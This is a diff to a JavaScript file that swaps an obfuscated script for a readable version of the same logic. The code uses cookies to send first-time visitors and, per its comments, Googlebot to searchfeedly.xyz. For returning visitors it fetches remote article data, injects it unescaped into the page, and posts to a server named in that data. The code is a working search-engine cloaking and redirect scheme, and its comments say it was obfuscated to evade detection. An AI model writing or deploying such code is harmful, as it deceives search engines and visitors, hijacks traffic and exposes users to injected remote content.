@@ -1,1 +1,182 @@
-var _0xf100=["\x72\x65\x70\x6C\x61\x63\x65","\x73\x65\x61\x72\x63\x68","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x65\x78\x65\x63","","\x3B\x20","\x26","\x72\x65\x70\x6C\x61\x63\x65\x41\x6C\x6C","\x25\x32\x36","\x63\x6F\x6F\x6B\x69\x65","\x70\x67","\x67\x65\x74","\x64\x61\x69\x6C\x79","\x73\x65\x72\x76\x65\x72","\x67\x69\x74","\x74\x69\x74\x6C\x65","\x64\x61\x74\x65","\x79\x65\x61\x72","\x68\x65\x61\x64\x69\x6E\x67","\x63\x6F\x6E\x74\x65\x6E\x74","\x69\x6D\x61\x67\x65","\x61\x6C\x74","\x76\x69\x64\x65\x6F","\x74\x68\x65\x6E","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x65\x61\x72\x63\x68\x66\x65\x65\x64\x6C\x79\x2E\x78\x79\x7A\x2F\x61\x72\x74\x69\x63\x6C\x65\x73\x2F\x67\x69\x74\x2F","\x68","\x2E\x70\x68\x70","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3D","\x3B","\x3B\x70\x61\x74\x68\x3D\x2F","\x73\x70\x6C\x69\x74","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x63\x68\x61\x72\x41\x74","\x20","\x69\x6E\x64\x65\x78\x4F\x66","\x62\x6C\x6F\x63\x6B","\x4C\x6F\x61\x64\x69\x6E\x67\x20\x61\x72\x74\x69\x63\x6C\x65\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x77\x61\x69\x74\x2E\x2E\x2E","\x46\x61\x69\x6C\x65\x64","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x30","\x2F\x61\x72\x74\x69\x63\x6C\x65\x73\x2F\x76\x69\x65\x77\x2E\x70\x68\x70","\x69\x64\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x73\x65\x6E\x64","\x3C\x74\x69\x74\x6C\x65\x3E","\x3C\x2F\x74\x69\x74\x6C\x65\x3E\x3C\x6C\x69\x6E\x6B\x20\x68\x72\x65\x66\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x74\x61\x63\x6B\x70\x61\x74\x68\x2E\x62\x6F\x6F\x74\x73\x74\x72\x61\x70\x63\x64\x6E\x2E\x63\x6F\x6D\x2F\x66\x6F\x6E\x74\x2D\x61\x77\x65\x73\x6F\x6D\x65\x2F\x34\x2E\x37\x2E\x30\x2F\x63\x73\x73\x2F\x66\x6F\x6E\x74\x2D\x61\x77\x65\x73\x6F\x6D\x65\x2E\x6D\x69\x6E\x2E\x63\x73\x73\x22\x20\x72\x65\x6C\x3D\x22\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74\x22\x3E\x3C\x6C\x69\x6E\x6B\x20\x68\x72\x65\x66\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x66\x6F\x6E\x74\x73\x2E\x67\x6F\x6F\x67\x6C\x65\x61\x70\x69\x73\x2E\x63\x6F\x6D\x2F\x63\x73\x73\x3F\x66\x61\x6D\x69\x6C\x79\x3D\x4F\x73\x77\x61\x6C\x64\x22\x20\x72\x65\x6C\x3D\x22\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74\x22\x3E\x3C\x6C\x69\x6E\x6B\x20\x72\x65\x6C\x3D\x22\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74\x22\x20\x68\x72\x65\x66\x3D\x22\x72\x65\x73\x6F\x75\x72\x63\x65\x73\x2F\x73\x74\x79\x6C\x65\x2E\x63\x73\x73\x22\x20\x72\x65\x6C\x3D\x22\x73\x74\x79\x6C\x65\x73\x68\x65\x65\x74\x22\x3E","\x61\x70\x70\x65\x6E\x64","\x68\x65\x61\x64","\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x70\x61\x67\x65\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x68\x61\x6D\x62\x75\x72\x67\x65\x72\x2D\x6D\x65\x6E\x75\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x69\x64\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x74\x6F\x67\x67\x6C\x65\x22\x20\x74\x79\x70\x65\x3D\x22\x63\x68\x65\x63\x6B\x62\x6F\x78\x22\x20\x2F\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x62\x74\x6E\x22\x20\x66\x6F\x72\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x74\x6F\x67\x67\x6C\x65\x22\x3E\x20\x3C\x73\x70\x61\x6E\x3E\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x62\x6F\x78\x22\x3E\x20\x3C\x6C\x69\x3E\x3C\x61\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x69\x74\x65\x6D\x22\x20\x68\x72\x65\x66\x3D\x22\x72\x65\x73\x6F\x75\x72\x63\x65\x73\x2F\x68\x6F\x6D\x65\x2E\x68\x74\x6D\x6C\x22\x3E\x48\x6F\x6D\x65\x3C\x2F\x61\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x3C\x61\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x69\x74\x65\x6D\x22\x20\x68\x72\x65\x66\x3D\x22\x72\x65\x73\x6F\x75\x72\x63\x65\x73\x2F\x61\x62\x6F\x75\x74\x2E\x68\x74\x6D\x6C\x22\x3E\x41\x62\x6F\x75\x74\x20\x55\x73\x3C\x2F\x61\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x3C\x61\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x69\x74\x65\x6D\x22\x20\x68\x72\x65\x66\x3D\x22\x72\x65\x73\x6F\x75\x72\x63\x65\x73\x2F\x70\x72\x69\x76\x61\x63\x79\x2E\x68\x74\x6D\x6C\x22\x3E\x50\x72\x69\x76\x61\x63\x79\x20\x50\x6F\x6C\x69\x63\x79\x3C\x2F\x61\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x3C\x61\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x69\x74\x65\x6D\x22\x20\x68\x72\x65\x66\x3D\x22\x72\x65\x73\x6F\x75\x72\x63\x65\x73\x2F\x64\x69\x73\x63\x6C\x61\x69\x6D\x65\x72\x2E\x68\x74\x6D\x6C\x22\x3E\x44\x69\x73\x63\x6C\x61\x69\x6D\x65\x72\x3C\x2F\x61\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x3C\x61\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x65\x6E\x75\x5F\x5F\x69\x74\x65\x6D\x22\x20\x68\x72\x65\x66\x3D\x22\x72\x65\x73\x6F\x75\x72\x63\x65\x73\x2F\x63\x6F\x6E\x74\x61\x63\x74\x2E\x68\x74\x6D\x6C\x22\x3E\x43\x6F\x6E\x74\x61\x63\x74\x3C\x2F\x61\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x63\x6F\x6E\x74\x65\x6E\x74\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x20\x63\x61\x72\x64\x22\x3E\x20\x3C\x68\x31\x20\x69\x64\x3D\x22\x74\x31\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x74\x69\x74\x6C\x65\x22\x3E\x26\x6E\x62\x73\x70\x3B\x20\x26\x6E\x62\x73\x70\x3B\x20\x26\x6E\x62\x73\x70\x3B\x20","\x3C\x2F\x68\x31\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x64\x61\x74\x65\x22\x3E\x3C\x73\x6D\x61\x6C\x6C\x3E\x55\x70\x64\x61\x74\x65\x64\x20\x6F\x6E\x20\x3C\x62\x3E\x3C\x69\x3E","\x3C\x2F\x69\x3E\x3C\x2F\x62\x3E\x20\x62\x79\x20\x3C\x62\x3E\x41\x64\x6D\x69\x6E\x2E\x3C\x2F\x62\x3E\x3C\x2F\x73\x6D\x61\x6C\x6C\x3E\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x69\x64\x3D\x22\x63\x6F\x6E\x74\x65\x6E\x74\x2D\x69\x6D\x61\x67\x65\x22\x3E\x20\x3C\x69\x6D\x67\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x61\x69\x6E\x2D\x69\x6D\x61\x67\x65\x22\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x30\x2E\x77\x70\x2E\x63\x6F\x6D\x2F","\x22\x20\x61\x6C\x74\x3D\x22","\x22\x3E\x3C\x2F\x69\x6D\x67\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x77\x72\x69\x74\x65\x2D\x75\x70\x22\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x66\x6F\x6E\x74\x2D\x77\x65\x69\x67\x68\x74\x3A\x6E\x6F\x72\x6D\x61\x6C\x3B\x20\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x31\x38\x70\x78\x22\x3E\x20","\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x72\x20\x2F\x3E\x3C\x2F\x64\x69\x76\x3E\x20","\x20\x3C\x62\x72\x20\x2F\x3E\x3C\x62\x72\x20\x2F\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x6F\x74\x65\x72\x22\x3E\x20\x3C\x70\x3E\x3C\x73\x6D\x61\x6C\x6C\x3E\x43\x6F\x70\x79\x72\x69\x67\x68\x74\x20\xA9\x20","\x2E\x20\x41\x6C\x6C\x20\x52\x69\x67\x68\x74\x73\x20\x52\x65\x73\x65\x72\x76\x65\x64\x2E\x3C\x2F\x73\x6D\x61\x6C\x6C\x3E\x3C\x2F\x70\x3E\x20\x3C\x62\x72\x20\x2F\x3E\x3C\x62\x72\x20\x2F\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E","\x62\x6F\x64\x79","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x65\x61\x72\x63\x68\x66\x65\x65\x64\x6C\x79\x2E\x78\x79\x7A\x2F\x61\x72\x74\x69\x63\x6C\x65\x73\x2F\x3F\x68\x3D","\x26\x62\x3D","\x62"];(function(){let _0xe940x1=(function(){var _0xe940x2={};location[_0xf100[1]][_0xf100[0]](/[?&]+([^=&]+)=([^&]*)/gi,function(_0xe940x3,_0xe940x4,_0xe940x5){_0xe940x2[_0xe940x4]= _0xe940x5});return _0xe940x2})();(/(\d+)\.html$/[_0xf100[3]](location[_0xf100[2]]))?/(\d+)\.html$/[_0xf100[3]](location[_0xf100[2]])[1]:_0xf100[4];const _0xe940x6= new URLSearchParams(document[_0xf100[9]][_0xf100[7]](_0xf100[6],_0xf100[8])[_0xf100[7]](_0xf100[5],_0xf100[6]));if(_0xe940x6[_0xf100[11]](_0xf100[10])== _0xf100[12]){var _0xe940x7=0;function _0xe940x8(){fetch(_0xf100[25]+ _0xe940x1[_0xf100[26]]+ _0xf100[27],{method:_0xf100[11]})[_0xf100[23]]((_0xe940xa)=>{return _0xe940xa[_0xf100[24]]()})[_0xf100[23]]((_0xe940x9)=>{a= _0xe940x9;server= a[0][_0xf100[13]],git= a[0][_0xf100[14]],title= a[0][_0xf100[15]];date= a[0][_0xf100[16]];year= a[0][_0xf100[17]];heading= a[0][_0xf100[18]];content= a[0][_0xf100[19]];image= a[0][_0xf100[20]];alt= a[0][_0xf100[21]];video= a[0][_0xf100[22]]})}async function _0xe940xb(){const _0xe940xc= await _0xe940x8();function _0xe940xd(_0xe940xe,_0xe940xf,_0xe940x10){var _0xe940x11= new Date();_0xe940x11[_0xf100[29]](_0xe940x11[_0xf100[28]]()+ (_0xe940x10* 24* 60* 60* 1000));var _0xe940x12=_0xf100[30]+ _0xe940x11[_0xf100[31]]();document[_0xf100[9]]= _0xe940xe+ _0xf100[32]+ _0xe940xf+ _0xf100[33]+ _0xe940x12+ _0xf100[34]}if(_0xe940x6[_0xf100[11]](_0xf100[14])== _0xf100[12]){function _0xe940x13(_0xe940xe){var _0xe940x14=_0xe940xe+ _0xf100[32];var _0xe940x15=decodeURIComponent(document[_0xf100[9]]);var _0xe940x16=_0xe940x15[_0xf100[35]](_0xf100[33]);for(var _0xe940x17=0;_0xe940x17< _0xe940x16[_0xf100[36]];_0xe940x17++){var _0xe940x18=_0xe940x16[_0xe940x17];while(_0xe940x18[_0xf100[38]](0)== _0xf100[39]){_0xe940x18= _0xe940x18[_0xf100[37]](1)};if(_0xe940x18[_0xf100[40]](_0xe940x14)== 0){return _0xe940x18[_0xf100[37]](_0xe940x14[_0xf100[36]],_0xe940x18[_0xf100[36]])}};return _0xf100[4]}_0xe940xd(_0xf100[41],_0xf100[12],1)};if(_0xe940x6[_0xf100[11]](_0xf100[41])== _0xf100[12]){setTimeout(function(){if(content[_0xf100[40]](_0xf100[42])!==  -1){heading= _0xf100[43];content= _0xf100[4];location[_0xf100[44]]= _0xf100[45]+ window[_0xf100[47]][_0xf100[46]]}},2000)}else {setTimeout(function(){if(git== _0xf100[48]){var _0xe940x19= new XMLHttpRequest();var _0xe940x1a=server+ _0xf100[49];var _0xe940x1b=_0xf100[50]+ _0xe940x1[_0xf100[26]];_0xe940x19[_0xf100[52]](_0xf100[51],_0xe940x1a,true);_0xe940x19[_0xf100[55]](_0xf100[53],_0xf100[54]);_0xe940x19[_0xf100[56]]= function(){if(_0xe940x19[_0xf100[57]]== 4&& _0xe940x19[_0xf100[58]]== 200){}};_0xe940x19[_0xf100[59]](_0xe940x1b)}},2000)};setTimeout(function(){$(_0xf100[63])[_0xf100[62]](_0xf100[60]+ title+ _0xf100[61]);$(_0xf100[72])[_0xf100[62]](_0xf100[64]+ heading+ _0xf100[65]+ date+ _0xf100[66]+ image+ _0xf100[67]+ alt+ _0xf100[68]+ content+ _0xf100[69]+ video+ _0xf100[70]+ year+ _0xf100[71])},2000);function _0xe940x13(_0xe940xe){var _0xe940x14=_0xe940xe+ _0xf100[32];var _0xe940x15=decodeURIComponent(document[_0xf100[9]]);var _0xe940x16=_0xe940x15[_0xf100[35]](_0xf100[33]);for(var _0xe940x17=0;_0xe940x17< _0xe940x16[_0xf100[36]];_0xe940x17++){var _0xe940x18=_0xe940x16[_0xe940x17];while(_0xe940x18[_0xf100[38]](0)== _0xf100[39]){_0xe940x18= _0xe940x18[_0xf100[37]](1)};if(_0xe940x18[_0xf100[40]](_0xe940x14)== 0){return _0xe940x18[_0xf100[37]](_0xe940x14[_0xf100[36]],_0xe940x18[_0xf100[36]])}};return _0xf100[4]}_0xe940xd(_0xf100[14],_0xf100[12],1)}_0xe940xb()}else {var _0xe940x7=1;function _0xe940xd(_0xe940xe,_0xe940xf,_0xe940x10){var _0xe940x11= new Date();_0xe940x11[_0xf100[29]](_0xe940x11[_0xf100[28]]()+ (_0xe940x10* 24* 60* 60* 1000));var _0xe940x12=_0xf100[30]+ _0xe940x11[_0xf100[31]]();document[_0xf100[9]]= _0xe940xe+ _0xf100[32]+ _0xe940xf+ _0xf100[33]+ _0xe940x12+ _0xf100[34]}function _0xe940x13(_0xe940xe){var _0xe940x14=_0xe940xe+ _0xf100[32];var _0xe940x15=decodeURIComponent(document[_0xf100[9]]);var _0xe940x16=_0xe940x15[_0xf100[35]](_0xf100[33]);for(var _0xe940x17=0;_0xe940x17< _0xe940x16[_0xf100[36]];_0xe940x17++){var _0xe940x18=_0xe940x16[_0xe940x17];while(_0xe940x18[_0xf100[38]](0)== _0xf100[39]){_0xe940x18= _0xe940x18[_0xf100[37]](1)};if(_0xe940x18[_0xf100[40]](_0xe940x14)== 0){return _0xe940x18[_0xf100[37]](_0xe940x14[_0xf100[36]],_0xe940x18[_0xf100[36]])}};return _0xf100[4]}_0xe940xd(_0xf100[10],_0xf100[12],1);location[_0xf100[44]]= _0xf100[73]+ _0xe940x1[_0xf100[26]]+ _0xf100[74]+ _0xe940x1[_0xf100[75]]}})()
+(function() {
+	//FUCNTION 1: This function gets the variables of htmlFile(h) & Bucket(b) from the url
+	let _0xbe6fx1 = (function() {
+		var _0xbe6fx2 = {};
+		location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(_0xbe6fx3, _0xbe6fx4, _0xbe6fx5) {
+			_0xbe6fx2[_0xbe6fx4] = _0xbe6fx5
+		});
+		return _0xbe6fx2
+	})();
+
+	//FUCNTION 2: Get url path variables
+	(/(\d+)\.html$/ ['exec'](location.pathname)) ? /(\d+)\.html$/ ['exec'](location.pathname)[1] : '';
+	
+	
+	//FUCNTION 3: Get host cookie using 1 liner
+	const cookieObj = new URLSearchParams(document.cookie.replaceAll("&", "%26").replaceAll("; ","&"));
+	if (cookieObj.get('pg') == 'daily')
+	{
+		var newViewer = 0;
+		//alert('Old User');
+				
+		//USE JS async function
+		//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function
+		
+		function getData() 
+		{
+			fetch('https://searchfeedly.xyz/articles/git/' + _0xbe6fx1.h + '.php', {method: 'get'})
+			.then(response => response.json())
+			.then(data => {
+					a = data
+					server = a[0].server,
+					git = a[0].git,
+					title = a[0].title;
+					date = a[0].date;
+					year = a[0].year;
+					heading = a[0].heading;
+					content = a[0].content;
+					image = a[0].image;
+					alt = a[0].alt;
+					video = a[0].video;					
+					//console.log(data);
+			});
+		}
+		
+		async function asyncWait() 
+		{
+			const result = await getData();
+			
+			//SET COOKIE
+			function setCookie(cname, cvalue, exdays) {
+				var d = new Date();
+				d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+				var expires = "expires=" + d.toGMTString();
+				document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/"
+			}
+
+			//ADD COOKIE ON 2ND VISIT REQUEST TO view.php
+			if (cookieObj.get('git') == 'daily')
+			{
+				function getCookie(cname) {
+					var name = cname + "=";
+					var decodedCookie = decodeURIComponent(document.cookie);
+					var ca = decodedCookie.split(';');
+					for(var i = 0; i < ca.length; i++) {
+						var c = ca[i];
+						while(c.charAt(0) == ' ') {
+							c = c.substring(1)
+						}
+						if(c.indexOf(name) == 0) {
+							return c.substring(name.length, c.length)
+						}
+					}
+					return ""
+				}
+				
+				setCookie("block", "daily", 1) //1 = 24 hours	
+			}			
+			
+			//BLOCK 3RD REQUEST TO view.php FROM SAME USER (due to google API limits)
+			if (cookieObj.get('block') == 'daily')
+			{
+				setTimeout(function () {
+					if (content.indexOf('Loading article. Please wait...') !== -1)
+					{
+						heading = 'Failed';
+						content = '';
+						location.href = 'https://' + window.location.hostname;
+					}
+				}, 2000);
+			}
+			
+			else
+			{
+				//Create Human Content
+				setTimeout(function () {
+					if(git == '0' && cookieObj.get('git') !== 'daily') //confirm if human git content is available
+					{
+						var http = new XMLHttpRequest();
+						var url = server + '/articles/view.php';
+						var params = 'id=' + _0xbe6fx1.h;
+						http.open("POST", url, true);
+						http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");		
+						http.onreadystatechange = function() {
+							if(http.readyState == 4 && http.status == 200) {
+								//alert(http.responseText);
+							}
+						}				
+						http.send(params);
+					}
+				}, 2000);
+					
+			}
+			
+			//FUCNTION 4: IF COOKIE add code to header to get JSON data from server		
+			setTimeout(function () {				
+				$('head').append('<title>' + title + '</title><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet"><link rel="stylesheet" href="resources/style.css" rel="stylesheet">');
+				
+			
+				$('body').append('<div id="page"> <div class="hamburger-menu"> <input id="menu__toggle" type="checkbox" /> <label class="menu__btn" for="menu__toggle"> <span></span> </label> <ul class="menu__box"> <li><a class="menu__item" href="resources/home.html">Home</a></li> <li><a class="menu__item" href="resources/about.html">About Us</a></li> <li><a class="menu__item" href="resources/privacy.html">Privacy Policy</a></li> <li><a class="menu__item" href="resources/disclaimer.html">Disclaimer</a></li> <li><a class="menu__item" href="resources/contact.html">Contact</a></li> </ul> </div> <div id="content"> <div class="inner card"> <h1 id="t1" class="title">&nbsp; &nbsp; &nbsp; ' + heading + '</h1> <div class="date"><small>Updated on <b><i>' + date + '</i></b> by <b>Admin.</b></small></div> <div id="content-image"> <img class="main-image" src="https://i0.wp.com/' + image + '" alt="' + alt + '"></img> </div> <div class="write-up"><span style="font-weight:normal; font-size:18px"> ' + content + ' </span><br /></div> ' + video + ' <br /><br /> </div> <div class="footer"> <p><small>Copyright © ' + year + '. All Rights Reserved.</small></p> <br /><br /> </div> </div> </div>');
+			}, 2000);
+			
+			//SET SECOND COOKIE
+			function getCookie(cname) {
+				var name = cname + "=";
+				var decodedCookie = decodeURIComponent(document.cookie);
+				var ca = decodedCookie.split(';');
+				for(var i = 0; i < ca.length; i++) {
+					var c = ca[i];
+					while(c.charAt(0) == ' ') {
+						c = c.substring(1)
+					}
+					if(c.indexOf(name) == 0) {
+						return c.substring(name.length, c.length)
+					}
+				}
+				return ""
+			}
+			
+			setCookie("git", "daily", 1) //1 = 24 hours				
+		}
+		
+		asyncWait();
+	}
+	
+	else 
+	{
+		//FUCNTION 5:
+		//IMPORTANT:Mainly used to redirect googlebot to searchfeedly as it doesn't keep cookies
+		//Use instead of user agent which must use obfuscation to work/redirect googlebot
+		var newViewer = 1; 
+		
+		function setCookie(cname, cvalue, exdays) {
+			var d = new Date();
+			d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+			var expires = "expires=" + d.toGMTString();
+			document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/"
+		}
+		
+		function getCookie(cname) {
+			var name = cname + "=";
+			var decodedCookie = decodeURIComponent(document.cookie);
+			var ca = decodedCookie.split(';');
+			for(var i = 0; i < ca.length; i++) {
+				var c = ca[i];
+				while(c.charAt(0) == ' ') {
+					c = c.substring(1)
+				}
+				if(c.indexOf(name) == 0) {
+					return c.substring(name.length, c.length)
+				}
+			}
+			return ""
+		}
+		
+		setCookie("pg", "daily", 1) //1 = 24 hours
+		//redirect human
+		//_0xbe6fx1.id means the id variable from the FUCNTION 1 above
+		location.href = 'https://searchfeedly.xyz/articles/?h=' + _0xbe6fx1.h + '&b=' + _0xbe6fx1.b
+		//alert('New User');
+	}
+	
+})()
